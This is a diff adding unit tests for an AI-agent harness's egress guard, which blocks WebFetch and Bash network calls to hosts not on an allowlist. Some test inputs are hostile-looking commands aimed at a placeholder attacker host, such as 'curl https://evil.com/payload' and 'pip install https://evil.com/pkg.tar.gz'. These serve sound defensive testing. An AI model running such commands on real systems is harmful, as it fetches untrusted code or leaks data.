@@ -973,3 +973,65 @@ class TestLuat6DuongDanTuyetDoi(unittest.TestCase):
         self.assertFalse(v.allowed)
         self.assertTrue(check_process_refs("STORY-01-01", f"{root}/docs/x.md", project_root=root).allowed)
         self.assertTrue(check_process_refs("STORY-01-01", f"{root}/.aisef/x.json", project_root=root).allowed)
+
+
+class TestEgressGuard(unittest.TestCase):
+    """V12: chặn kết nối tới host chưa khai."""
+
+    def test_empty_allowlist_allows_everything(self):
+        from aisef.harness.guardrails import check_egress
+        v = check_egress("WebFetch", {"url": "https://evil.com/x"}, [])
+        self.assertTrue(v.allowed)
+
+    def test_allowed_host_passes(self):
+        from aisef.harness.guardrails import check_egress
+        v = check_egress("WebFetch", {"url": "https://api.github.com/repos"}, ["api.github.com"])
+        self.assertTrue(v.allowed)
+
+    def test_disallowed_host_blocks(self):
+        from aisef.harness.guardrails import check_egress
+        v = check_egress("WebFetch", {"url": "https://evil.com/steal"}, ["api.github.com"])
+        self.assertFalse(v.allowed)
+        self.assertIn("evil.com", v.reason)
+
+    def test_wildcard_suffix_match(self):
+        from aisef.harness.guardrails import check_egress
+        v = check_egress("WebFetch", {"url": "https://sub.example.com/x"}, ["*.example.com"])
+        self.assertTrue(v.allowed)
+        v2 = check_egress("WebFetch", {"url": "https://example.com/x"}, ["*.example.com"])
+        self.assertTrue(v2.allowed)
+        v3 = check_egress("WebFetch", {"url": "https://notexample.com/x"}, ["*.example.com"])
+        self.assertFalse(v3.allowed)
+
+    def test_bash_curl_checked(self):
+        from aisef.harness.guardrails import check_egress
+        v = check_egress("Bash", {"command": "curl https://evil.com/payload"}, ["pypi.org"])
+        self.assertFalse(v.allowed)
+
+    def test_bash_no_url_passes(self):
+        from aisef.harness.guardrails import check_egress
+        v = check_egress("Bash", {"command": "ls -la"}, ["pypi.org"])
+        self.assertTrue(v.allowed)
+
+    def test_bash_non_network_command_with_url_passes(self):
+        from aisef.harness.guardrails import check_egress
+        v = check_egress("Bash", {"command": "echo https://evil.com"}, ["pypi.org"])
+        self.assertTrue(v.allowed)
+
+    def test_bash_pip_install_checked(self):
+        from aisef.harness.guardrails import check_egress
+        v = check_egress("Bash", {"command": "pip install https://evil.com/pkg.tar.gz"}, ["pypi.org"])
+        self.assertFalse(v.allowed)
+
+    def test_run_guard_dispatches_egress(self):
+        from aisef.harness.guardrails import ENV_ALLOW_HOSTS, run_guard
+        event = {"tool_name": "WebFetch", "tool_input": {"url": "https://evil.com/x"}}
+        env = {ENV_ALLOW_HOSTS: "api.github.com"}
+        v = run_guard("egress", event, env=env)
+        self.assertFalse(v.allowed)
+
+    def test_run_guard_egress_empty_allows(self):
+        from aisef.harness.guardrails import run_guard
+        event = {"tool_name": "WebFetch", "tool_input": {"url": "https://anywhere.com"}}
+        v = run_guard("egress", event, env={})
+        self.assertTrue(v.allowed)
